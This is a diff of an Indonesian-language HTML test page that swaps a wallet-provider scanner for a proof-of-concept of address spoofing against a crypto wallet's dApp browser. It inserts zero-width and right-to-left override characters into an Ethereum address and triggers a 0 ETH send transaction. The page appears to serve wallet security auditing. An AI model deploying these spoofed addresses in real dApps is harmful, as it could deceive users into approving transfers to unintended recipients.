@@ -2,76 +2,71 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Security Audit - dApp Browser</title>
+    <title>Audit: Address Spoofing Test</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .log-container { background: #000; border: 1px solid #333; padding: 15px; border-radius: 5px; height: 400px; overflow-y: scroll; margin-top: 10px; }
-        .bug-btn { background: #ff4757; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
-        .info-card { border-left: 3px solid #00ff00; padding-left: 15px; margin-bottom: 20px; }
-        .secret-info { color: #ff9f43; }
+        body { font-family: sans-serif; padding: 30px; background: #f0f2f5; }
+        .test-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        button { background: #e91e63; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
+        .address-display { font-family: monospace; background: #eee; padding: 10px; word-break: break-all; font-size: 0.85rem; border-radius: 5px; }
+        h4 { margin-top: 20px; color: #333; }
     </style>
 </head>
 <body>
 
-    <h2>🔍 dApp Environment Scanner</h2>
-    
-    <div class="info-card">
-        <button class="bug-btn" onclick="startAudit()">Mulai Scan Provider</button>
-        <p>Gunakan ini untuk melihat variabel apa saja yang diekspos oleh Slush Wallet ke browser.</p>
-    </div>
+<div class="test-box">
+    <h2>PoC: Address Spoofing</h2>
+    <p>Gunakan tes ini untuk melihat bagaimana wallet menampilkan alamat yang mengandung karakter khusus.</p>
 
-    <div class="log-container" id="log">
-        > Menunggu perintah...
-    </div>
+    <h4>1. Zero-Width Space Injection</h4>
+    <p class="address-display" id="addr1"></p>
+    <button onclick="testSpoof(1)">Kirim ke Alamat Ini</button>
+
+    <h4>2. RTL Override (Membalik Urutan)</h4>
+    <p class="address-display" id="addr2"></p>
+    <button onclick="testSpoof(2)">Kirim ke Alamat Ini</button>
+</div>
+
+<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 
 <script>
-    const logDiv = document.getElementById('log');
+    // Alamat asli (Ganti dengan alamat testing milikmu)
+    const REAL_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
 
-    function log(msg, isWarning = false) {
-        const time = new Date().toLocaleTimeString();
-        const color = isWarning ? "#ff4757" : "#00ff00";
-        logDiv.innerHTML += `<div style="color: ${color}">[${time}] ${msg}</div>`;
-        logDiv.scrollTop = logDiv.scrollHeight;
-    }
+    // 1. Menyisipkan Zero-Width Space (U+200B) di tengah alamat
+    // Ini bertujuan melihat apakah wallet memfilter karakter non-render
+    const zeroWidthAddr = REAL_ADDRESS.slice(0, 10) + "\u200B" + REAL_ADDRESS.slice(10);
+    document.getElementById('addr1').innerText = "Target: " + zeroWidthAddr;
 
-    async function startAudit() {
-        log("Memulai inspeksi window.ethereum...");
+    // 2. Menggunakan RTL Override (U+202E)
+    // Berpotensi membalikkan tampilan teks di beberapa UI wallet
+    const rtlAddr = "\u202E" + REAL_ADDRESS.split('').reverse().join('');
+    document.getElementById('addr2').innerText = "Target: " + rtlAddr;
 
-        // 1. Cek keberadaan provider
-        if (window.ethereum) {
-            log("✅ Provider terdeteksi: window.ethereum");
-            
-            // Cek properti internal (Seringkali wallet membocorkan nama atau versi)
-            if (window.ethereum.isMetaMask) log("Info: Provider mengklaim sebagai MetaMask (Spoofing?)");
-            if (window.ethereum.isSlush) log("Info: Terdeteksi sebagai Slush Wallet secara eksplisit.");
-            
-            // 2. Cek Request Accounts (Izin)
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                log(`✅ Akses Diterima. Alamat: ${accounts[0]}`);
-                
-                // 3. Cek RPC Metadata
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                log(`Chain ID: ${chainId}`);
+    async function testSpoof(type) {
+        if (!window.ethereum) return alert("Wallet tidak ditemukan");
+        
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const target = (type === 1) ? zeroWidthAddr : rtlAddr;
 
-                // 4. Eksplorasi Properti Non-Standar (Potensi Bug Informasi)
-                // Beberapa wallet membocorkan state internal di objek ini
-                const internalState = JSON.stringify(window.ethereum._state || "Tidak ada data _state");
-                log(`Internal State: <span class="secret-info">${internalState}</span>`);
+        const transactionParameters = {
+            to: target, // Alamat dengan karakter spesial
+            from: accounts[0],
+            value: '0x0', // 0 ETH saja untuk tes
+            gas: '0x5028', // 21000 gas
+        };
 
-            } catch (err) {
-                log(`❌ Error/Ditolak: ${err.message}`, true);
-            }
-        } else {
-            log("❌ window.ethereum tidak ditemukan. Pastikan dibuka di dApp Browser Slush.", true);
+        try {
+            log("Memicu konfirmasi wallet...");
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [transactionParameters],
+            });
+        } catch (error) {
+            console.error("User menolak atau error:", error);
         }
-
-        // 5. Cek Objek Global lain (Seringkali provider menginjeksi lebih dari satu objek)
-        const commonInjections = ['web3', 'ethereum', 'slush', 'trustwallet'];
-        commonInjections.forEach(key => {
-            if (window[key]) log(`🔍 Objek ditemukan di window.${key}`);
-        });
     }
+
+    function log(msg) { console.log("[Audit]", msg); }
 </script>
 </body>
 </html>
